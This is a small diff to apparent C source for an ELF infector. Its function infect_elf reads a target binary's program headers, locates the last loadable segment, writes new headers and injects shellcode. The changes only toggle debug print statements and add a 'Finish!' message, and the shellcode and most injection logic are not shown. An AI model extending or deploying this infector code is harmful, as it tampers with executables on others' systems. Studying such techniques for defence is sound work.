@@ -84,14 +84,14 @@ void infect_elf(char* name){
 
   // print information
   // XXX remove printf below after debug
-  info_ehdr(ehdr);
+  // info_ehdr(ehdr);
   for(int i = 0; i < e_phnum_old; i++){
     int phdr_fov = e_phoff + i * e_phentsize;
     lseek(target_fd, phdr_fov, SEEK_SET);
     read(target_fd, phdr + i, e_phentsize);
 
-    printf("num: %d\n", i);
-    info_phdr(phdr[i]);
+    // printf("num: %d\n", i);
+    // info_phdr(phdr[i]);
     if(phdr[i].p_type == PT_LOAD){
       last_loadable_seg_index = i;
     }
@@ -124,6 +124,7 @@ void infect_elf(char* name){
   // print the new headers
   printf("new_phdr\n");
   info_phdr(new_phdr);
+  printf("new ehdr");
   info_ehdr(ehdr);
 
   // // XXX debugging. delete this later
@@ -132,7 +133,7 @@ void infect_elf(char* name){
   //   printf("%#x ", shellcode[i]);
   // }
 
-  printf("\njmp_val=%x", jmp_val);
+  // printf("\njmp_val=%x", jmp_val);
 
   printf("Start injection...\n");
   lseek(target_fd, 0, SEEK_SET);
@@ -155,5 +156,6 @@ int main(int argc, char**argv){
     exit(0);
   }
   infect_elf(argv[1]);
+  printf("Finish! :D\n");
   return 0;
 }
